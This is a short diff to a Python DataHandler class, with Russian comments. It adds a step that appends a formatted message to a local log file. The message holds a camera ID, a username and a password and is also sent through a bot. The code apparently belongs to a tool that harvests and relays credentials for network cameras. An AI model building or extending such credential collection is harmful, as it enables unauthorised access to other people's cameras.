@@ -46,6 +46,9 @@ class DataHandler:
                                   f"*Идентификатор камеры*: `{self.camera_id}`\n" \
                                   f"*Пользователь* {user_emoji}: `{username}`\n" \
                                   f"*Пароль* {lock_emoji}: `{password}`"
+                        # Запись в файл
+                        with open('data_log.txt', 'a') as file:
+                            file.write(message)
                         self.bot.send_message(message)
                     protocol.active = False
                     protocol.transport.close()
